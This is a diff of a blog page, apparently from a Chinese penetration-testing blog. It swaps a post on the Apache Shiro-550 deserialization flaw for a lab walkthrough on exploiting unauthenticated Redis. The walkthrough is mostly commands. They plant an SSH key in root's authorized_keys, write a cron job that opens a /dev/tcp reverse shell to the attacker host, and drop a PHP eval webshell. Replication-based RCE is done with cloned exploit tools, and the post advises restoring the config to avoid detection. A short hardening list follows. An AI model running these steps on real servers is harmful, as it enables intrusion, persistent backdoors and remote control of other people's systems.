@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="shiro550_CVE-2016-4437, 渗透测试 CTF southerose 信息安全 网络安全 网络空间安全 博客 学习">
+    <meta name="keywords" content="redis的简单利用, 渗透测试 CTF southerose 信息安全 网络安全 网络空间安全 博客 学习">
     <meta name="description" content="渗透测试 | 信息安全 | CTF">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>shiro550_CVE-2016-4437 | southerose&#39;s Blog</title>
+    <title>redis的简单利用 | southerose&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -291,12 +291,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/southerose/PictureBed/raw/master/img/20211116184633.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/southerose/PictureBed/raw/master/img/20220214122429.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">shiro550_CVE-2016-4437</h1>
+                    <h1 class="description center-align post-title">redis的简单利用</h1>
                 </div>
             </div>
         </div>
@@ -412,8 +412,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/shiro%E6%BC%8F%E6%B4%9E/">
-                                <span class="chip bg-color">shiro漏洞</span>
+                            <a href="/tags/redis/">
+                                <span class="chip bg-color">redis</span>
                             </a>
                         
                     </div>
@@ -437,28 +437,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-09-20
+                    2021-10-11
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-11-16
+                    2022-02-14
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    389
+                    1.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    6 分
                 </div>
                 
 
@@ -481,48 +481,173 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0X01-漏洞描述"><a href="#0X01-漏洞描述" class="headerlink" title="0X01 漏洞描述"></a>0X01 漏洞描述</h1><p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</p>
-<p>rememberMe的AES加密泄露可影响任意版本的shiro，造成反序列化漏洞。</p>
-<h1 id="0X02-漏洞原理"><a href="#0X02-漏洞原理" class="headerlink" title="0X02 漏洞原理"></a>0X02 漏洞原理</h1><p>Apache Shiro框架在cookie中有一个字段，提供记住我（rememberMe）的功能，也就是关闭了浏览器以后再打开，不需要在登陆。</p>
-<p>shiro对rememberMe的加密过程：</p>
-<ul>
-<li>获取rememberMe cookie</li>
-<li>序列化</li>
-<li>AES加密</li>
-<li>Base64编码操作</li>
-</ul>
-<p>shiro在识别身份时对rememberMe的解密密过程：</p>
-<ul>
-<li>获取rememberMe cookie</li>
-<li>Base64解码操作</li>
-<li>AES解密（加密密钥硬编码）</li>
-<li>反序列化（没有过滤）</li>
-</ul>
-<p>但是，AES加密的密钥Key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。</p>
-<h1 id="0X03-漏洞复现"><a href="#0X03-漏洞复现" class="headerlink" title="0X03 漏洞复现"></a>0X03 漏洞复现</h1><h2 id="漏洞验证过程"><a href="#漏洞验证过程" class="headerlink" title="漏洞验证过程"></a>漏洞验证过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211115094732.png"></p>
-<p>打开主页发现出现remember me，抓包重放发现返回包中出现<code>rememberMe=deleteMe</code></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211115095502.png"></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/insightglacier/Shiro_exploit%EF%BC%8C%E4%BD%BF%E7%94%A8%E8%AF%A5poc%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B">https://github.com/insightglacier/Shiro_exploit，使用该poc进行检测</a></p>
-<pre class="line-numbers language-none"><code class="language-none">python3 shiro_exploit.py -t 3 -u http://192.168.60.134:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <h1 id="redis简介"><a href="#redis简介" class="headerlink" title="redis简介"></a>redis简介</h1><p>Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库</p>
+<p>端口：6379</p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><blockquote>
+<p>kali =&gt;192.168.60.134</p>
+<p>cenos =&gt; 192.168.60.130</p>
+</blockquote>
+<h1 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h1><p>Redis默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上</p>
+<pre class="line-numbers language-none"><code class="language-none">./redis-server 使用默认配置
+./redis-server ../redis.conf 使用自定义配置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211115163825.png"></p>
-<p>存在漏洞，即可进行进一步利用。</p>
-<h2 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h2><h3 id="1-反弹shell"><a href="#1-反弹shell" class="headerlink" title="1.反弹shell"></a>1.反弹shell</h3><p><a target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211115191557.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211115191645.png"></p>
-<p>输入目标地址，开始检测漏洞。</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211115191727.png"></p>
-<p>攻击机监听</p>
-<pre class="line-numbers language-none"><code class="language-none">nc -lvp 1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<table>
+<thead>
+<tr>
+<th>未授权访问</th>
+<th>bind</th>
+<th>protected-mode</th>
+<th>连接</th>
+<th>执行命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td>127.0.0.1</td>
+<td>yes</td>
+<td>不能</td>
+<td>不能</td>
+</tr>
+<tr>
+<td>能</td>
+<td>0.0.0.0</td>
+<td>yes</td>
+<td>能</td>
+<td>能</td>
+</tr>
+<tr>
+<td></td>
+<td>不绑定</td>
+<td>yes</td>
+<td>能</td>
+<td>不能</td>
+</tr>
+<tr>
+<td>能</td>
+<td>不绑定</td>
+<td>no</td>
+<td>能</td>
+<td>能</td>
+</tr>
+</tbody></table>
+<p>总结：造成未授权访问有两种情况：</p>
+<ol>
+<li>未开启登录验证，并且把IP绑定到0.0.0.0</li>
+<li>未开启登录验证，没有设置绑定IP，<code>protected-mode</code>关闭</li>
+</ol>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>Redis有两种持久化的方式：<strong>快照（RDB文件）</strong>和追加式文件（AOF文件）</p>
+<p><strong>RDB方式</strong>：备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改，造成可以写任意文件.</p>
+<pre class="line-numbers language-none"><code class="language-none">config set dir aa 设置备份目录为xx
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211115191936.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211115191852.png"></p>
-<p>收到反弹的shell</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211115192005.png"></p>
-<h3 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h3><p><a target="_blank" rel="noopener" href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211115192545.png"></p>
-<p>命令执行</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211115192618.png"></p>
+config set dbfilename bb 设置备份文件名为xx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="一、写SSH-keygen"><a href="#一、写SSH-keygen" class="headerlink" title="一、写SSH-keygen"></a>一、写SSH-keygen</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
+<li>root账号启动redis服务</li>
+<li>服务器开放SSH服务，允许密钥登录。</li>
+</ol>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ol>
+<li><p>kali上生成公私钥</p>
+<pre class="line-numbers language-none"><code class="language-none">ssh-keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p>未授权访问redis</p>
+<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 192.168.60.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p>利用redis的数据备份功能修改备份目录为 /redis/.ssh/ 备份文件名为 authorized_keys</p>
+<pre class="line-numbers language-none"><code class="language-none">config set dir /root/.ssh
+config set dbfilename authorized_keys
+save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+<li><p>写入key-value</p>
+<pre class="line-numbers language-none"><code class="language-none">set a "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDiqG0Pp2TFXOKg/AdFZv2mdDKizbL85GrbGUg6ZoEpjWnoB9JGRSkSCfz/LoB0kokZ+iPMXPSETxn+Hs5Y13V9jQ0n+O5mDrO+eUSKhkKTTZBjjweIuoCjLvHcwuIHC1T3+S+U895Ur8Ea6tETRNPlKylgO9McsQjNg88q4RFo+vSXaU1IMs8kcyJ26wVeB8tAU/9nEKsjQkip52ENqSIqR3qdEQWV0Eoc9XrXT4o78TKQfkCSUTFUFgOO+9NYUfnWkR5KtbHusyRfNOKlkauFsgoIzHBQBl2K0pU4LkeA5D6YTHZwYwqId0AewSwCNzxq6GAbEVzmIJ3KzhOkjZXs3/JNmweX3DVdyPaXf57IogVyxkWtSGbA2QtUbWL96o8QT1TIvODA2H6s6ktq88/jTfOSInlhURzkxNYXLjvwRi/918ze0f7ISICGlbtkWR0audGfZwjLeYfjI5INc9mPBUjybSQDuCFI2oVOFFBbWWwdB4ipB8pyYf9JrsOMRO0= root@kali\n"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p>ssh连接</p>
+<pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa root@192.168.60.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<h2 id="二、写计划任务反弹shell"><a href="#二、写计划任务反弹shell" class="headerlink" title="二、写计划任务反弹shell"></a>二、写计划任务反弹shell</h2><blockquote>
+<p>/var/spool/cron/目录下存放的为以各个用户命名的计划任务文件，root用户可以修改任意用户的计划任务。dbfilename设置为root为用root用户权限执行计划任务。</p>
+<p>执行命令反弹shell(写计划任务时会覆盖原来存在的用户计划任务).写文件之前先获取dir和dbfilename的值，以便恢复redis配置，将改动降到最低，避免被发现。</p>
+</blockquote>
+<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
+<li>redis是root用户启动</li>
+</ol>
+<h3 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h3><ol>
+<li><p>设置数据库备份目录为linux计划任务目录</p>
+<pre class="line-numbers language-none"><code class="language-none">config set dir /var/spool/cron/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p>设置备份文件名为root，以root身份执行计划任务</p>
+<pre class="line-numbers language-none"><code class="language-none">config set dbfilename root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p>将反弹shell写入b键值并同步保存</p>
+<pre class="line-numbers language-none"><code class="language-none">set a "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.60.134/4444 0&gt;&amp;1\n\n"
+
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>然后等待一会儿就可以看到反弹的shell</p>
+</li>
+</ol>
+<h2 id="三、写webshell"><a href="#三、写webshell" class="headerlink" title="三、写webshell"></a>三、写webshell</h2><h3 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
+<li>已知web的绝对路径</li>
+<li>具有读写权限</li>
+</ol>
+<h3 id="利用过程-2"><a href="#利用过程-2" class="headerlink" title="利用过程"></a>利用过程</h3><ol>
+<li><p>设置数据库备份目录为linux计划任务目录</p>
+<pre class="line-numbers language-none"><code class="language-none">config set dir /var/www/html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p>写入webshell并同步保存</p>
+<pre class="line-numbers language-none"><code class="language-none">set c "\n\n\n&lt;?php @eval($_POST['rose']);?&gt;\n\n\n" 
+
+config set dbfilename webshell.php 
+
+save 同步保存操作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h2 id="四、利用主从复制获取shell"><a href="#四、利用主从复制获取shell" class="headerlink" title="四、利用主从复制获取shell"></a>四、利用主从复制获取shell</h2><blockquote>
+<p>Redis支持主从同步。数据可以从主服务器向任意数量的从服务器上同步，从服务器可以是关联其他从服务器的主服务器。这使得Redis可执行单层树复制。存盘可以有意无意的对数据进行写操作。由于完全实现了发布/订阅机制，使得从数据库在任何地方同步树时，可订阅一个频道并接收主服务器完整的消息发布记录。同步对读取操作的可扩展性和数据冗余很有帮助。</p>
+</blockquote>
+<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。</p>
+<p>然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p>
+<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>下载利用脚本</p>
+<pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
+cd RedisModules-ExecuteCommand/
+make
+git clone https://github.com/Ridter/redis-rce
+python redis-rce.py -r 192.168.1.154 -L 192.168.1.153 -f module.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/twosmi1e/p/13308682.html#3517039648">https://www.cnblogs.com/twosmi1e/p/13308682.html#3517039648</a></p>
+<p>详细分析：<a target="_blank" rel="noopener" href="https://paper.seebug.org/975/#redis">https://paper.seebug.org/975/#redis</a></p>
+<h2 id="五、lua-rce"><a href="#五、lua-rce" class="headerlink" title="五、lua rce"></a>五、lua rce</h2><p>高权限运行低版本redis的lua虚拟机，写文件失败时可以进行尝试。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/237263.html">https://www.freebuf.com/articles/web/237263.html</a></p>
+<p> <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/151203/">https://www.anquanke.com/post/id/151203/</a></p>
+<p>EXP: <a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/redis_lua_exploit/">https://github.com/QAX-A-Team/redis_lua_exploit/</a></p>
+<h2 id="六、反序列化rce"><a href="#六、反序列化rce" class="headerlink" title="六、反序列化rce"></a>六、反序列化rce</h2><p>当遇到 redis 服务器写文件无法 getshell，可以查看redis数据是否符合序列化数据的特征。<br>序列化数据类型分辨:</p>
+<pre class="line-numbers language-none"><code class="language-none">jackson：关注 json 对象是不是数组，第一个元素看起来像不像类名，例如["com.blue.bean.User",xxx]
+fastjson：关注有没有 @type 字段
+jdk：首先看 value 是不是 base64，如果是解码后看里面有没有 java 包名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>redis 反序列化本质上不是 redis 的漏洞，而是使用 redis 的应用反序列化了 redis 的数据而引起的漏洞，redis 是一个缓存服务器，用于存储一些缓存对象，所以在很多场景下 redis 里存储的都是各种序列化后的对象数据。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/237263.html">https://www.freebuf.com/articles/web/237263.html</a></p>
+<h3 id="脚本工具"><a href="#脚本工具" class="headerlink" title="脚本工具"></a>脚本工具</h3><p>利用<br><a target="_blank" rel="noopener" href="https://github.com/00theway/redis_exp">https://github.com/00theway/redis_exp</a><br>检测<br><a target="_blank" rel="noopener" href="https://github.com/Ridter/hackredis">https://github.com/Ridter/hackredis</a></p>
+<h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><ol>
+<li>禁止一些高危命令</li>
+<li>以低权限运行 Redis 服务</li>
+<li>为 Redis 添加密码验证</li>
+<li>禁止外网访问 Redis</li>
+<li>修改默认端口</li>
+<li>保证 authorized_keys 文件的安全</li>
+<li>设置防火墙策略</li>
+</ol>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Windows下如何getshell？</p>
+<ul>
+<li>写入webshell，需要知道web路径</li>
+<li>写入启动项，需要目标服务器重启</li>
+<li>写入MOF，MOF每隔5秒钟会自动执行一次，适用于Windows2003。</li>
+</ul>
+<p>实战在生产环境下用还是会有很多问题的</p>
+<ol>
+<li>redis数据量稍微大一点，写shell到文件之后，php因为文件太大是会拒绝执行的</li>
+<li>Ubuntu，Debian写计划任务反弹无用</li>
+<li>写/etc/passwd会覆盖原有/etc/passwd，不可能改了再改回来</li>
+<li>生产环境下用<code>KEY *</code> 这样的命令直接炸</li>
+</ol>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/twosmi1e/p/13308682.html#3517039648">https://www.cnblogs.com/twosmi1e/p/13308682.html#3517039648</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/249238.html">https://www.freebuf.com/articles/web/249238.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/237263.html">https://www.freebuf.com/articles/web/237263.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/148758.html">https://www.freebuf.com/vuls/148758.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/975/#redis">https://paper.seebug.org/975/#redis</a></li>
+</ul>
 
                 
             </div>
@@ -549,7 +674,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://southerose.gitee.io/2021/09/20/shiro550-cve-2016-4437/">http://southerose.gitee.io/2021/09/20/shiro550-cve-2016-4437/</a>
+                    <a href="http://southerose.gitee.io/2021/10/11/redis-de-jian-dan-li-yong/">http://southerose.gitee.io/2021/10/11/redis-de-jian-dan-li-yong/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -587,8 +712,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/shiro%E6%BC%8F%E6%B4%9E/">
-                                    <span class="chip bg-color">shiro漏洞</span>
+                                <a href="/tags/redis/">
+                                    <span class="chip bg-color">redis</span>
                                 </a>
                             
                         </div>
@@ -758,9 +883,59 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/10/11/redis-de-jian-dan-li-yong/">
+                    <div class="card-image">
+                        
+                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220214122429.png" class="responsive-img" alt="redis的简单利用">
+                        
+                        <span class="card-title">redis的简单利用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    复现
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/redis/">
+                        <span class="chip bg-color">redis</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2021/09/20/shiro-quan-xian-rao-guo-cve-2020-1957/">
                     <div class="card-image">
@@ -777,9 +952,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-09-20
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-20
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -797,62 +972,6 @@
                     
                     <a href="/tags/shiro%E6%BC%8F%E6%B4%9E/">
                         <span class="chip bg-color">shiro漏洞</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/07/10/buuctf-web-wp/">
-                    <div class="card-image">
-                        
-                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211116173634.png" class="responsive-img" alt="buuctf-web-wp">
-                        
-                        <span class="card-title">buuctf-web-wp</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-10
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/ctf/" class="post-category">
-                                    ctf
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/buuctf/">
-                        <span class="chip bg-color">buuctf</span>
-                    </a>
-                    
-                    <a href="/tags/wp/">
-                        <span class="chip bg-color">wp</span>
-                    </a>
-                    
-                    <a href="/tags/web/">
-                        <span class="chip bg-color">web</span>
                     </a>
                     
                 </div>
